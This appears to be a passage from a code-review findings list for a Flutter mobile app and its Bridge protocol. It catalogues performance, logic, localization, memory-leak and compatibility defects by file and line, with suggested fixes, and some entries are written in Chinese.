- `D-8` **[perf]** `apps/mobile/lib/features/file_transfer/file_transfer_sheet.dart:97` — Non-lazy ListView(children:) builds up to 200 received-file rows at once
  The sheet uses ListView(children: [...]) so all service.receivedFiles entries (capped at 200 by fileTransferReceivedFileListLimit) are built eagerly on open; ListView.builder would build lazily.
- `B6` **[logic]** `apps/mobile/lib/features/file_transfer/file_transfer_sheet.dart:275` — Inbox share path is a separate implementation lacking mimeType and name overrides
  Entries 1 and 3 share _shareArtifact (safe filename + sharePositionOrigin) while the inbox entry uses its own XFile(file.path) share with no mimeType and no fileNameOverrides, giving inconsistent share behavior for the same file.
- `A3` **[l10n]** `apps/mobile/lib/features/file_transfer/file_transfer_sheet.dart:520` — Three _*Copy classes are binary zh/en switches; ja/ko users get English
  _TransferCopy (also chat_input_with_overlays.dart:1278 and session_list_screen.dart:3006) branch only on languageCode == 'zh', so Japanese (the template language and main user base) and Korean users see English, e.g. the whole File Transfer panel. This is a regression introduced by the Chinese localization work; convert to the 4-language switch pattern.
- `C-11/C22` **[bug]** `apps/mobile/lib/features/file_transfer/file_transfer_storage.dart:571` — cleanupPickerOrphans deletes staging directories still being written
  It unconditionally deletes every ccpocket-picker-* directory without checking in-use status. initialize() runs asynchronously after first frame, so if the user has already dropped a file and stageExternalFile is mid-copy, the in-progress copy.tmp directory gets deleted underneath it.
- `C-10/C21` **[leak]** `apps/mobile/lib/features/file_transfer/file_transfer_storage.dart:1121` — .tmp files from interrupted atomic writes are never cleaned
  _atomicJson writes <dest>.<suffix>.tmp then renames, deleting in finally; if the process is killed or power is lost the .tmp survives, and _loadJsonFiles plus capacity accounting only consider .json files, so these orphans are never scanned or deleted.
- `9/D-9/D10` **[bug]** `apps/mobile/lib/features/gallery/gallery_screen.dart:49` — Empty-state fallback shows the previous session's gallery images
  When GalleryCubit state is empty the screen falls back to bridge.galleryImages, the global last gallery list; in the window between requestGallery and its response the user sees the prior session/project's images with a wrong title count. Should use null for not-loaded and clear before requesting.
- `6/D-8/D9` **[perf]** `apps/mobile/lib/features/gallery/widgets/gallery_content.dart:114` — Missing list keys; file_transfer_sheet builds up to 200 rows eagerly; Hero tag can assert
  GalleryTile's ValueKey sits on an inner GestureDetector so sliver element reuse is unkeyed, message_images list items also lack keys, and file_transfer_sheet uses a non-lazy ListView(children:[...]) instantiating up to 200 tiles at once. The Hero(tag:'gallery_${image.id}') has no destination and duplicate ids in two subtrees trigger the multiple-heroes assertion.
- `11/D-7/D8` **[bug]** `apps/mobile/lib/features/gallery/widgets/gallery_image_viewer.dart:100` — Share path buffers whole image, deletes temp file during recipient read, swallows errors
  response.bodyBytes reads the entire image into memory with no size cap; the finally block deletes the temp file immediately after share returns while the Android receiver may still be lazily reading the URI; catch(_) swallows all exceptions with no logging. Related: chat_input_with_overlays.dart:817 loops readAsBytes for up to 5 images and draft_service's _imageCache has no eviction.
- `5/D-6/D6` **[leak]** `apps/mobile/lib/features/gallery/widgets/gallery_image_viewer.dart:277` — CurvedAnimation instances leak status listeners on AnimationController
  Each double-tap or interaction-end creates a new CurvedAnimation whose addStatusListener is only removed by an explicit dispose() that never happens; old instances accumulate on the controller's listener chain. generated_image_preview_page.dart:78-88 has the same defect at higher frequency (_animateTo called from double-tap and every drag end).
- `8` **[perf]** `apps/mobile/lib/features/generated_image_preview/generated_image_preview_screen.dart:138` — allowImplicitScrolling keeps at least 3 full-resolution bitmaps resident
  PageView with allowImplicitScrolling:true caches one page on each side, and each page renders full-resolution Image.memory, so at least three original bitmaps (48MB at 2048 squared) are simultaneously in memory.
- `13/D-13` **[bug]** `apps/mobile/lib/features/git/git_screen.dart:819` — Any git operation failure replaces the whole diff list with a full-screen error
  _GitScreenContent returns DiffErrorState whenever state.error != null, and stage/unstage/revert/pull/push failures all write the same error field. One failed stage wipes the entire diff view, leaving only error text with no auto-clear path other than a manual refresh.
- `9/D-9` **[bug]** `apps/mobile/lib/features/git/state/git_view_cubit.dart:240` — Image auto-load silently dropped by concurrency throttle; spinner spins forever
  When loadingImageIndices reaches _maxConcurrentLoads the request is silently discarded, but _triggerAutoLoad only fires once per build so the widget never retries and stays on the placeholder spinner. If a diff_image_result never arrives (e.g. path rejected as type:error) the slot is never freed and eventually all image loads are blocked.
- `7` **[bug]** `apps/mobile/lib/features/message_images/message_images_screen.dart:167` — Data-URL concat bug plus keyless, uncapped-decode image list
  '$httpBaseUrl${imageList.first.url}' (and :251) blindly prefixes possibly-data URLs producing invalid URLs, same root cause as image_preview.dart. _MultiImageList's ListView.separated items have no key and no cacheWidth, so several full-resolution images decode per screen.
- `D-8` **[perf]** `apps/mobile/lib/features/message_images/message_images_screen.dart:246` — ListView.separated items lack keys and cacheWidth
  Message image list items have neither keys (state misalignment on list shifts) nor cacheWidth (full-resolution decode of every image in the list).
- `B5` **[logic]** `apps/mobile/lib/features/mobile_update/mobile_update_service.dart:188` — Switching owner->stable keeps the pending owner patch and still prompts restart
  setChannel preserves MobileUpdatePhase.restartRequired when a downloaded-but-unapplied patch exists, so a user who explicitly abandoned the owner channel still installs the owner patch on restart. Offer a discard-pending-patch option or explicit wording that the pending patch came from owner.
- **[l10n]** `apps/mobile/lib/features/notification_settings/l10n/notification_settings_strings.dart` — 12 *_strings.dart files carry 965 strings outside the ARB translation pipeline
  These hand-rolled 4-language classes (notification_settings 169, permission_management 116, mobile_update 112, etc.) are functionally correct but invisible to external translators, translation memory, and terminology checks; several build text via languageCode bool getters without a dedicated _en field. Register as tech debt, force ARB for new features, and gate new *_strings.dart in CI.
- `8/E-11` **[logic]** `apps/mobile/lib/features/session_archive/session_archive_cubit.dart:152` — Dedup/unsupported false treated as failure; snackbar shows stale state.error
  _mutate returns false silently for duplicate-pending or unsupported without emitting an error, but the screen treats every false as failure and renders strings.failed(cubit.state.error ?? ''). Users see 'operation failed:' with empty detail or, worse, an unrelated error left over from a previous operation.
- `E-12` **[bug]** `apps/mobile/lib/features/session_archive/session_archive_screen.dart:76` — No refresh on reconnect; bare ListView instantiates thousands of tiles with no load-more
  The connection listener only handles the non-connected branch so the list stays stale after reconnect, and the screen builds all tiles eagerly in a plain ListView(children:) with no builder virtualization; the truncated notice has no 'load more' affordance.
- `7/E-15` **[bug]** `apps/mobile/lib/features/session_insights/widgets/session_insights_bar.dart:75` — Detail bottom sheet holds controller that the bar's dispose destroys
  _removeController() unconditionally disposes the owned controller when the bar unmounts, but the modal sheet is a separate route holding the same instance via ListenableBuilder and onRefresh. Using a ChangeNotifier after dispose hits _debugAssertNotDisposed (debug crash, undefined in release) when the underlying bar is removed while the sheet is open.
- `6/E-14` **[bug]** `apps/mobile/lib/features/session_insights/widgets/session_insights_bar.dart:315` — _SessionInsightsPanelState lacks didUpdateWidget; shows stale session after switch
  _SessionInsightsBarState reinstalls its controller on sessionId change but _SessionInsightsPanelState only has initState/dispose. When Flutter reuses the State on session switch, the panel keeps the old sessionId's controller, displaying the wrong session's context/quota and leaking the old controller's subscription into the new lifetime.
- `M-3` **[logic]** `apps/mobile/lib/features/session_list/data/session_catalog_cache_repository.dart:250` — "清理会话目录缓存"实际范围大于 UI 承诺且统计低估
  clearAll() 删 partitionsTable，经 ON DELETE CASCADE 连带删除所有机器分区的 entries、aliases、hotWindows、hotEntries（离线打开会话的第一屏来源），而 countAllSessions 只统计 entries。用户以为只清了目录，实际连离线首屏数据一并删掉。
- `C-2` **[logic]** `apps/mobile/lib/features/session_list/session_list_projection.dart:198` — Identity key flips runtime→claude when claudeSessionId arrives
  Before system init claudeSessionId is null so the key is runtime\0-based; once it arrives the key changes, temporarily duplicating list rows with separate pin/unread state. The existing _rememberProviderSessionBinding table is unused for rebinding.
- `B4` **[bug]** `apps/mobile/lib/features/session_list/session_list_screen.dart:717` — 5-tap debug entry on home AppBar has no kDebugMode guard in release
  _onTitleTap pushes DebugRoute after 5 taps with no guard (only one kReleaseMode hit exists in lib/), exposing in release: the full Talker log viewer (all Bloc transitions including machine host/port/SSH usernames), Mock Preview, and force-support-prompt toggles.
- `C-3` **[perf]** `apps/mobile/lib/features/session_list/state/session_list_cubit.dart:134` — 每条 sessionList 广播都无条件触发全分区 SELECT + 主 isolate 逐行 jsonDecode
  会话状态每次变化 Bridge 都 broadcast，每次都调用 repository.load()：全分区 SELECT（上限 10000 行）加主线程逐行 jsonDecode。应仅在 _currentCacheTarget()?.fingerprint 变化时才重载。
- `C-4` **[logic]** `apps/mobile/lib/features/session_list/state/session_list_cubit.dart:222` — legacy Bridge 路径强制 hasMore=false 且无 tombstone，幽灵会话常驻且封死分页
  无 catalogRevision 时 canDisplayLegacyCompleteCache 强制 hasMore=false，_mergeCachedSessions 无 tombstone 机制，服务器已删除的会话以幽灵形式常驻，用户也无法分页拉取真实数据。
- `C-2` **[logic]** `apps/mobile/lib/features/session_list/state/session_list_cubit.dart:630` — 缓存回写发生在 networkSerial 新鲜度检查之前，缓存完整性被误失效
  _loadCatalogCacheForCurrentTarget 把 DB 快照写回 _loadedCacheFingerprint/Revision/Complete/_cachedSessions 早于新鲜度检查（检查只护住 emit），upsertResponse 又是 fire-and-forget。load 进行中收到完整 catalog 网络响应时，load 以旧 DB 内容完成 → 下一条响应因 revision 不匹配把 _loadedCacheComplete 置 false。
- `B3` **[bug]** `apps/mobile/lib/features/settings/settings_screen.dart:1762` — Developer settings unlocked by 7 taps with no re-lock path
  Seven taps on the settings version row call unlockDeveloperSettings() which persists 'true' to secure storage, and MobileUpdateService has no lock/reset method. Any ordinary user following a walkthrough can switch to the unverified owner patch channel permanently.
- `E-18` **[bug]** `apps/mobile/lib/features/side_chat/state/ephemeral_side_chat_registry_service.dart:236` — Registry refresh failures swallowed by catchError((_) {}) — empty list unattributable
  unawaited(refresh().catchError((_) {}))in _reconcileCapability discards timeouts, parse failures, and Bridge errors with no UI trace; combined with A-8's strict parsing this yields a permanently empty side-chat list users cannot diagnose. Surface refresh errors to the UI.
- `A-5` **[bug]** `apps/mobile/lib/features/side_chat/widgets/ephemeral_side_chat_pane.dart:86` — Capability-negotiation race permanently downgrades pane to legacy self-made chat
  isSupported reads the instantaneous _bridge.capabilities snapshot; opening the pane before negotiation completes (or while disconnected) pins _useLegacyFallback=true and _registryChanged returns early forever after. The user gets the 553-line legacy SideChatPanel instead of the official session UI until the pane is reopened. Only set fallback on an explicit unsupported response; otherwise wait and listen for capability changes.
- `A-4` **[bug]** `apps/mobile/lib/features/side_chat/widgets/ephemeral_side_chat_pane.dart:246` — Retry button dead-ends when floating-dock child disappeared from registry
  After the child vanishes (Bridge restart or closed elsewhere), the retry button re-runs _resolveOrOpen which still reads the immutable widget.childSessionId, so entryForChild is always null and the error reappears in a loop with no exit. Retry should degrade to opening a fresh ephemeral child when the remembered id no longer resolves.
- `E-17` **[bug]** `apps/mobile/lib/features/side_chat/widgets/persisted_side_chat_pane.dart:80` — SideChatStrings.of(context) called from initState throws FlutterError
  initState → _listenAndOpen → _open calls SideChatStrings.of which uses Localizations.localeOf (dependOnInheritedWidgetOfExactType), illegal in initState, triggered when the pane opens while Bridge is disconnected; line 74 also calls setState in initState. Currently dead code per A-6, but must be fixed if the pane is kept.
- `C-2` **[logic]** `apps/mobile/lib/features/side_chat/widgets/side_chat_panel.dart` — Two self-made chat renderers persist alongside the official session UI
  Legacy SideChatPanel (553 lines) + side_chat_controller (762) + side-chat.ts (1241) form a parallel bubble renderer still reachable via the A-5 fallback race, and subagents_panel.dart:352-410 flattens all message types to Text/SelectableText with tool JSON stringified — no markdown, diff highlighting, or bubble reuse. After fixing A-5 the legacy panel should be deleted and subagent history should use ChatMessageList/bubbles with only the data source swapped.
- `B-3` **[bug]** `apps/mobile/lib/features/subagents/state/subagents_controller.dart:28` — Mobile 12s timeout collides with Bridge 12-15s deadline; slow responses misreported as unsupported
  Bridge's DEFAULT_SUBAGENT_DEADLINE_MS is 12s (max 15s) while Mobile's requestTimeout is 12s and on expiry clears _listRequestId and sets listError='unsupported'; a response arriving at 12.x s is discarded (lines 188-191) and the UI wrongly claims the Bridge lacks subagent support. Raise the Mobile timeout above Bridge max + RTT and report 'timeout' instead of 'unsupported'.
- `B-5` **[logic]** `apps/mobile/lib/features/subagents/widgets/subagents_panel.dart` — Subagent panel is read-only: no cancel/interrupt path exists at all
  The panel is explicitly a read-only browser and subagents.ts exposes only get_subagents/get_subagent_history; the product requirement of converging cancelled subagents has no implementation path, and stopping a runaway subagent from the floating dock would require a new protocol message.
- **[l10n]** `apps/mobile/lib/l10n/app_en.arb` — 88 dead ARB keys; several have translations while the UI hardcodes English
  88 of 872 keys have zero references under lib/ (double-checked with strict and loose matching plus test/), costing 352 useless translations. Cross-signals: 'explorer' is dead while explore_screen.dart hardcodes Text('Explorer'); same for searchHint/viewChanges/noActiveSessions — revive those four first, then delete the rest.
- `A6` **[l10n]** `apps/mobile/lib/l10n/app_ja.arb` — 88 dead ARB entries (10.1%) carried across 4 languages
  88 template keys are never referenced under lib/ (352 translations maintained for nothing), though some may be reachable via dynamic lookup and need per-key confirmation before deletion. An arb_lint tool checking template-superset and template-key-usage in CI is recommended.
- **[l10n]** `apps/mobile/lib/l10n/app_ja.arb` — Placeholder @meta declarations missing: ja 5 (template, highest risk), en 14, ko 21, zh 20
  Values contain {placeholder} without a placeholders declaration; since ja is the template, its 5 missing declarations (removeProjectConfirm, toolSuggestionTitle, toolSuggestionInstall, toolSuggestionConnect, rewindConfirmBody) are the riskiest, and a template switch would break immediately. Actual cross-language placeholder set inconsistencies: 0 (the plural false positive was excluded).
- `R-3` **[logic]** `apps/mobile/lib/main.dart:894` — 深链 SessionLinkParams 分支硬编码 provider: 'claude'
  多数路径靠 `resolution.provider ?? _provider` 能纠正，但 SessionLinkOpenLegacy 分支（session_link_screen.dart:78-81）用的是未经解析的 widget provider → 旧 Bridge 上打开 Codex 会话会进 Claude 屏幕。
- **[bug]** `apps/mobile/lib/models/local_features/protocol_host.dart:109` — No wire-type uniqueness across 13 slots; first silently wins; O(n) routing
  Duplicate supportedServerMessageTypes let the first slot win silently and the getter's .toSet() hides duplicates from capability broadcast; routing does linear List.contains per message across 13 slots, paid per entry during history batches. Fix: static Map registry with duplicate assertion (O(1) routing).
- **[bug]** `apps/mobile/lib/models/local_features/slots/auto_approval_protocol_slot.dart:119` — is! int rejects JSON doubles; >4096 hard cap rejects legal values
  jsonDecode('{"n":2.0}') yields double in Dart while JS can't distinguish 2.0 from 2, so serialization boundaries produce doubles that throw; the 4096 upper bound also discards legitimate large counts wholesale. Fix: reuse _codexCoreActionInt-style num+integrality check; clamp instead of reject.
- **[compat]** `apps/mobile/lib/models/local_features/slots/auto_approval_protocol_slot.dart:137` — error XOR errorCode requirement drops error-only responses
  ((error==null) != (errorCode==null)) forces both fields together; Bridge sending only error (the most common shape) gets dropped so the user sees neither error nor completion. Same over-strict XOR at ephemeral_side_chat:188-192/259-263 and persisted_side_chat:111-115 (entry XOR error kills result+warning and pending-ack shapes). Fix: default errorCode 'unknown'.
- **[bug]** `apps/mobile/lib/models/local_features/slots/codex_core_actions_protocol_slot.dart:200` — Closed status/action whitelists + helper trim mismatch can hang requests
  status/action whitelists (:200-215,:350-358) drop messages on new values like 'queued'/'partial', hanging pending requests; _codexCoreActionString (:394-399) silently nulls overlong messages (error detail vanishes) yet makes overlong sessionId fatal, and trims IDs while the sender does not, so a requestId with edge whitespace never matches matchesTerminalResponse and the request hangs. Fix: unknown mapping + split requiredId()/optionalText().
- `A11` **[compat]** `apps/mobile/lib/models/local_features/slots/codex_core_actions_protocol_slot.dart:205` — codex_action_result: action/status closed sets throw
  action must be compact/review and status within a 4-value set or the whole message throws; _codexCoreActionString additionally nulls over-length strings, silently dropping long messages.
- **[logic]** `apps/mobile/lib/models/local_features/slots/codex_core_actions_protocol_slot.dart:305` — Client take(128)/take(64) truncation not reflected in truncated flags
  rawTools.take(128) (and servers take(64) at :362) silently truncates client-side while toolsTruncated comes only from the server; 200 tools with truncated:false shows 128 items claimed complete. Fix: truncated = serverFlag || rawList.length > limit.
- **[bug]** `apps/mobile/lib/models/local_features/slots/codex_core_actions_protocol_slot.dart:394` — _codexCoreActionString: silent null on overlong text; trim mismatch hangs matches
  message >2000 chars silently becomes null (error detail vanishes, indistinguishable from absent) while sessionId >256 chars becomes fatal — one helper with contradictory semantics; it also trims IDs the sender never trims, so a requestId with edge whitespace never satisfies matchesTerminalResponse and the request hangs. Fix: split requiredId() (no trim, error on overlong) and optionalText() (truncate + flag).
- **[bug]** `apps/mobile/lib/models/local_features/slots/codex_desktop_continuity_protocol_slot.dart:199` — historyReady/handoffQueued bare as bool?; state-coupling validator also throws
  0/1 or "true" values throw TypeError dropping the event; additionally _validateCodexDesktopContinuityEvent:274-278 throws when historyReady is true but state isn't idle, so a Bridge semantic tweak drops frames. Fix: json['x'] == true style parsing; relax the coupling check.
- **[compat]** `apps/mobile/lib/models/local_features/slots/codex_desktop_continuity_protocol_slot.dart:269` — origin != 'desktop_rollout' throws; any new origin drops the event
  A hardcoded origin literal check throws FormatException for new sources like desktop_rollout_v2/desktop_live, dropping the whole continuity event. Fix: ignore events with unexpected origins.
- **[compat]** `apps/mobile/lib/models/local_features/slots/codex_desktop_continuity_protocol_slot.dart:274` — historyReady/state coupling assertion breaks on Bridge semantic tweaks
  The validator throws when historyReady is true but state is not idle; any minor Bridge semantic adjustment drops the whole event. Fix: degrade to log + accept.
- `A-9` **[compat]** `apps/mobile/lib/models/local_features/slots/conversation_content_protocol_slot.dart:97` — Conversation content slot throws FormatException if message is not a map
  A future array-wrapped message shape fails the whole decode instead of being skipped, breaking the additive-protocol expectation.
- **[compat]** `apps/mobile/lib/models/local_features/slots/conversation_content_protocol_slot.dart:371` — subscribed event requires hotConversationLimit; old Bridge cannot subscribe
  The subscribed event mandates hotConversationLimit != null, so an older Bridge lacking the field cannot establish the subscription — the opposite of graceful degradation. Fix: new fields optional with client defaults; strict only for subscriptionId/revision.
- `A10` **[compat]** `apps/mobile/lib/models/local_features/slots/conversation_content_protocol_slot.dart:459` — Provider hard whitelist {'claude','codex'} throws in content/mirror slots
  Also conversation_mirror_protocol_slot 196-200 and 315-319; any third provider breaks these slots outright.
- **[logic]** `apps/mobile/lib/models/local_features/slots/conversation_mirror_protocol_slot.dart:86` — Error-to-pending matching by requestType text only; cross-session consumption
  The matcher checks error.message.contains(requestType) with no session/requestId correlation, contradicting the :88-89 comment; concurrent conversation_mirror_sync in two sessions lets session A's generic error consume session B's pending slot. Fix: require sessionId/requestId in ErrorMessage matching; prefer timeout over misattribution.
- **[leak]** `apps/mobile/lib/models/local_features/slots/conversation_mirror_protocol_slot.dart:128` — Constructors keep caller-mutable collections; unmodifiable only in fromJson
  mirror rawMessage/entries/deletes (:128-133,:289-307), content (:85-90,:128-148) and session_insights credits/limitCards/providers (:348-351,:386-394,:441-446) hold externally mutable collections when constructed outside fromJson (tests, mocks, forwarding like continuity:205); const constructors falsely suggest immutability. Fix: unmodifiable wrapping in constructors.
- **[perf]** `apps/mobile/lib/models/local_features/slots/conversation_mirror_protocol_slot.dart:320` — Mirror entries/upserts have no length cap; hostile Bridge can OOM the app
  Unlike conversation_content (2000/32 caps at :4-6,190-198), mirror events (:320-326, :502-516) materialize unbounded entries lists with per-entry Map.unmodifiable; a buggy/malicious Bridge sending a million entries OOMs mobile. Fix: mirror the content-slot caps.
- **[bug]** `apps/mobile/lib/models/local_features/slots/conversation_mirror_protocol_slot.dart:355` — notModified parsed with bare as bool?, the only field bypassing helpers
  json['notModified'] as bool? ?? false throws TypeError if the backend sends "true" or 1, dropping the whole mirror event; every other field in the file goes through _conversationMirror* helpers. Fix: tolerant bool helper.
- **[compat]** `apps/mobile/lib/models/local_features/slots/conversation_mirror_protocol_slot.dart:435` — protocolVersion written as 1 outbound but never read on decode (all slots)
  Outbound messages hardcode protocolVersion:1 (mirror:435, content:317/333/344/353) yet no decode path reads a server version, so a v2 Bridge changing field semantics is silently misread as v1; file_transfer's v2/v3 detection via type-string compare (:36-39,368-380) silently drops savedPath on downgrade. Fix: carry and validate protocolVersion in events with minimal-fields degradation.
- `A-8` **[compat]** `apps/mobile/lib/models/local_features/slots/ephemeral_side_chat_protocol_slot.dart:104` — Strict key-whitelist parsing + swallowed errors: Bridge upgrade silently kills side chat
  _sideChatRequireOnlyKeys rejects any unknown key, so a new Bridge field throws FormatException; bridge_service.dart:1872-1877 emits a generic sessionId:null Parse error, the registry message is dropped, refresh() times out, and the catchError((_){}) in _reconcileCapability swallows everything. Users see a permanently empty side-chat list with an unattributable parse error. Parse forward-compatibly (ignore unknown keys) and surface refresh failures.
- **[logic]** `apps/mobile/lib/models/local_features/slots/ephemeral_side_chat_protocol_slot.dart:118` — Timestamps ISO-string-only; naive vs Z strings mix local and UTC values
  _sideChatRequiredString throws on num inputs (inconsistent with subagents accepting epoch numbers), and DateTime.tryParse yields local for offset-less strings but UTC for Z — both stored in the same field, misordering and mis-displaying times. Fix: accept num+String, store toUtc(), display toLocal().
- **[compat]** `apps/mobile/lib/models/local_features/slots/ephemeral_side_chat_protocol_slot.dart:188` — entry-XOR-error assertions kill result+warning and pending-ack shapes
  ephemeral_side_chat:188-192/259-263 and persisted_side_chat:111-115 require exactly one of entry or error; a response carrying both a result and a warning, or a pending ack with neither, is rejected wholesale. Fix: relax to prefer entry, log the anomaly.
- `C08` **[logic]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:8` — All file-browser requests share constant ownerSessionId '__file_browser__'
  Correlation is requestId-only, so after switching Bridges a late response from the previous Bridge can still match a pending request.
- `P2-6` **[perf]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:174` — No ==/hashCode on any model; every refresh looks fully changed
  FileBrowserRoot/Node/StatResultItem and all result messages use reference equality, so refreshing a directory yields identical content in all-new objects and any listEquals/Set dedup/AnimatedList diff sees everything as changed, forcing full list rebuilds and losing scroll/animation stability. Node has a natural cheap key (rootId+relativePath+nodeRevision).
- `P2-4` **[logic]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:218` — Timestamps carried as String through models; tz handling left to consumers
  modifiedAt/expiresAt are validated then stored as raw strings, so every consumer must independently DateTime.tryParse and remember toUtc()/toLocal(). Any single missed conversion is a silent timezone bug; the model should expose UTC-normalized DateTime.
- `P2-1` **[compat]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:259` — Explicit null treated differently from missing field; explicit null throws
  Optional handling uses if (!json.containsKey(field)) return null, so an explicit "mimeType": null falls into the required branch and throws (also :1272-1279, :1299-1306, :1393-1396, :1407-1413). The current TS Bridge avoids this only by conditional spreading — luck, not contract; file_transfer:594-597 uses the opposite (value==null) semantics. Fix: unify json[field]==null -> null.
- `P2-5` **[compat]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:262` — Symlink cross-field consistency assertion blocks entire listing
  The decoder throws if isSymlink, kind, and targetKind do not match an exact scheme; if the Bridge ever reports kind as the target type plus an isSymlink flag (a common refactor), whole directories become undecodable. Display-level metadata inconsistency should degrade with a log, not block the list.
- `P3-2` **[leak]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:431` — Public constructors keep caller-mutable collections; only fromJson wraps them
  List.unmodifiable is applied only on fromJson paths; public const constructors (file_browser:431-442/522-532/677-683, mirror:128-133/289-307, content:85-90/128-148, session_insights:266-267/348-351/386-394/441-446, side_chat:160/189) hold collections the caller can still mutate; SideChatQuestionRequest.questions inner Maps stay mutable while request_user_input.dart writes question['options'] in place. Fix: unmodifiable wrapping in constructors, deep for Maps.
- `A08` **[compat]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:890` — FileMutationAuthEvent.parse throws on unknown value
  Same closed-enum-throw pattern in file mutation auth events.
- `P2-7` **[compat]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:941` — Mutation-auth state machine rejects any extra or missing state fields
  state/enrolled events require both passwordConfigured and biometricEnrolled; challenge events must not contain state fields at all. Any evolution (e.g. passkey) or partial state fails the whole auth response, so the user cannot enter the file-mutation authorization flow and per P1-5 hangs until timeout. Missing capability bits should default to false.
- `P2-2` **[compat]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:1382` — Strict is! int rejects JSON doubles; dart2js vs native behavior split
  sizeBytes serialized as 1.0 or exponent form (JS JSON.stringify emits 1e+21 for huge numbers) parses as double on the Dart VM and throws FormatException. On web 1.0 is int is true while on native it is false, so the same payload passes in web/simulator tests and fails on device. Same check in file_transfer_protocol_slot.dart:615-627.
- **[compat]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:1398` — Timestamp validator requires trailing Z, rejecting +00:00 offsets
  file_browser forces Z-suffixed timestamps, hard-rejecting the +00:00 form commonly produced by Python datetime.isoformat() and Go RFC3339; three files apply three different timestamp rules (file_transfer accepts anything parseable, subagents guesses units). Fix: accept both Z and numeric offsets, normalize toUtc().
- `P2-8` **[compat]** `apps/mobile/lib/models/local_features/slots/file_transfer_protocol_slot.dart:641` — Token/etag formats hardcoded to exact lengths (43 / quoted 32)
  Regexes demand a token of exactly 43 base64url chars and an etag of exactly a quoted 32-char string; a server change to token length, W/ weak etags, or sha256 digests breaks all uploads/downloads with no client-visible cause. Should validate charset plus a bounded length range instead.
- `B04/P2-3` **[bug]** `apps/mobile/lib/models/local_features/slots/file_transfer_protocol_slot.dart:669` — expiresAt accepts timezone-less timestamps that parse as local time
  file_transfer only checks DateTime.tryParse succeeds without requiring a timezone, so a naive string like 2026-07-26T10:00:00 is treated as local time in downstream DateTime comparisons in file_transfer_http/storage, shifting token-expiry judgment by the device's UTC offset (8h in UTC+8). Meanwhile file_browser (:1398-1405) hard-rejects the common +00:00 offset form, an inconsistent contract.
- **[perf]** `apps/mobile/lib/models/local_features/slots/session_insights_models_slot.dart` — All slot model classes lack value equality; consumers cannot dedupe updates
  FileBrowserNode, SubagentInfo, EphemeralSideChatEntry, ContextUsage, SessionUsageWindow etc. have no ==/hashCode; session_insights_controller.dart:168-176 unconditionally notifyListeners() on every context_usage with no way to dedupe (ContextUsage()==ContextUsage() is always false), forcing redundant rebuilds. Fix: value equality (listEquals) for state-held models.
- **[perf]** `apps/mobile/lib/models/local_features/slots/session_insights_models_slot.dart:7` — No ==/hashCode on any model in the four files; controller cannot dedupe
  ContextTokenUsage/ContextUsage (:7/:59), session_insights windows/cards/credits (:196/222/278/344/377/434), mirror (:122/267) and content (:84/127) models compare by reference; session_insights_controller.dart:168-176 notifyListeners() on every context_usage even when identical, forcing rebuilds with no dedupe possible. Fix: value equality (listEquals/DeepCollectionEquality) plus controller-side early return.
- **[logic]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:210` — resetsAt timezone depends on wire type; naive strings parsed as local time
  The numeric branch produces Z-suffixed UTC while the string branch passes naive strings that DateTime.tryParse treats as local; downstream toLocal() is a no-op on the misclassified values, silently skewing countdowns by one timezone (8h in UTC+8) in usage_section.dart:496 and session_insights_bar.dart:560. Fix: treat offset-less strings as UTC and normalize.
- `B05` **[bug]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:218` — resetsAt/expiresAt naive tryParse — quota countdown off by a timezone
  resetsAtDateTime/expiresAtDateTime parse offset-less strings as local; the usage-reset countdown is wrong by the Bridge-vs-phone tz difference.
- **[bug]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:266` — spendControlReached bare as bool?; individualLimit holds raw untyped Object
  Non-bool spendControlReached throws TypeError; individualLimit stores the raw decoded Object? (possibly mutable Map/List) with no type constraint or copy — mutable-leak plus type escape. Fix: tolerant bool helper; normalize + Map.unmodifiable for individualLimit.
- **[leak]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:267` — individualLimit holds raw decoded Object? with no typing or copy
  The field directly stores the raw JSON value (possibly a mutable Map/List), a combined type-escape and mutable-leak. Fix: normalize via _sessionUsageStringKeyedMap + Map.unmodifiable.
- **[logic]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:405` — hasData filter drops rate-limit-reached cards lacking window data
  hasData => fiveHour != null || sevenDay != null, but cards carrying only rateLimitReachedType/spendControlReached (exactly the 'limit reached' scenario where window data is typically absent) are filtered out by .where((card) => card.hasData), hiding the most important state. Fix: extend hasData.
- **[logic]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:414` — provider silently defaults to '' making codexUsage permanently null
  Missing/renamed provider (e.g. openai) collapses to '' so session_insights_controller.dart:65's provider=='codex' never matches; UI stays blank with hasError false and no signal. Fix: drop-and-log or expose an unrecognized-provider flag.
- **[logic]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:495` — Epoch sec/ms heuristic misclassifies; UTC vs naive-local strings mixed
  value.abs() < 1e11 treats pre-1973 millisecond stamps as seconds (x1000) and micro/nano stamps as milliseconds (silently year 50000); the numeric branch outputs Z-suffixed UTC while the string branch passes naive strings through, later parsed as local time, skewing countdowns by a timezone (+8h in CST). Same code duplicated at subagents_models_slot.dart:80-92. Fix: shared _parseUtcTimestamp with unit contract and range guard.
- **[bug]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:518` — Universal toString() string coercion (also session_insights_models_slot:119)
  errorCode maps become literal "{code: 5}" rendered in UI and numeric sessionIds become strings participating in relevance checks — the loose opposite of the file's overly strict numeric parsing. Fix: String-only (optionally num) acceptance, null for Map/List.
- **[bug]** `apps/mobile/lib/models/local_features/slots/side_chat_protocol_slot.dart:174` — questions.length mismatch escalated to FormatException; user never sees prompt
